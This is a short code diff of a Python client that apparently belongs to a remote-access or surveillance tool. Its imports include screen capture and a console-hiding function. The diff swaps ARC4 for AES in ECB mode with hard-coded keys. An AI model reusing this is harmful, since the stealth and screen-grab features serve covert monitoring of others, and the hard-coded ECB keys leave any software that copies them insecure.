@@ -8,7 +8,7 @@ import base64
 from PIL import ImageGrab
 from packet import Packet
 from encryption import encrypt,decrypt
-from Crypto.Cipher import ARC4
+from Crypto.Cipher import AES
 
 def hide():
     import win32console,win32gui
@@ -114,12 +114,13 @@ class Client:
         self.enqueue(pkt)
 
     def encryptData(self,pkt):
-        key = '\x01\x02\x03\x04\x05'
-        cipher = ARC4.new(key)
+        key = '\x40\x73\x8a\xc7\x8f\x0f\xd5\xef\x02\x57\xb2\xe1\x9b\x83\x04\x15'
+        cipher = AES.new(key,AES.MODE_ECB)
+        pkt.padData()
         pkt.data = cipher.encrypt(pkt.data)
 
     def sendRC4Key(self):
-        key = '\x01\x02\x03\x04\x05'
+        key = '\x01\x02\x03\x04\x05\x01\x02\x03\x04\x05\x01\x02\x03\x04\x05\x00'
         pkt = Packet()
         pkt.state = '100'
         pkt.toIP = ''
